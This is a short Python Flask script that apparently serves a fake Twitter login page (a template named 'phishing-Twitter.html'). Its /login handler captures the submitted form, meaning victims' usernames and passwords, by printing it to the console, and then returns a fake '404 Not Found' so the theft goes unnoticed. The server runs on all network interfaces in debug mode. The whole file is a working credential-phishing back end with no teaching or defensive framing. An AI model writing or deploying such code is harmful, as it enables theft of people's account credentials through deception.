from flask import Flask, render_template,request

app = Flask(__name__)

@app.route('/Twitterlogin')
def index():
    
    return render_template('phishing-Twitter.html')
    
@app.route('/login',methods=['post'])
def login():
    print('[*]',request.form)
    return '404 Not Found'

def main():
    print('hello')
    app.run(host="0.0.0.0",debug=True,port=8080)


main()

